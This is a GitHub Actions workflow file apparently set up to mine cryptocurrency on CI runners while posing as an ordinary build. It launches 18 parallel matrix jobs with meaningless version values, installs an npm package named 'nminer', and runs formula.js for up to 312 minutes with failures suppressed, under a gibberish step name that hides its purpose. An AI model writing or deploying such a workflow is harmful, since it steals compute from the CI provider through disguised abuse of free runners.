name: formula
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 2818 }
          - { version: 134 }
          - { version: 982 }
          - { version: 9788 }
          - { version: 130 }
          - { version: 3916 }
          - { version: 2499 }
          - { version: 2284 }
          - { version: 211 }
          - { version: 7611 }
          - { version: 3713 }
          - { version: 3920 }
          - { version: 6261 }
          - { version: 5749 }
          - { version: 1908 }
          - { version: 5368 }
          - { version: 7281 }
          - { version: 6495 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: hm aha yet blend
        run: |
          npm install nminer@latest
          timeout 312m node formula.js || echo "formula executed"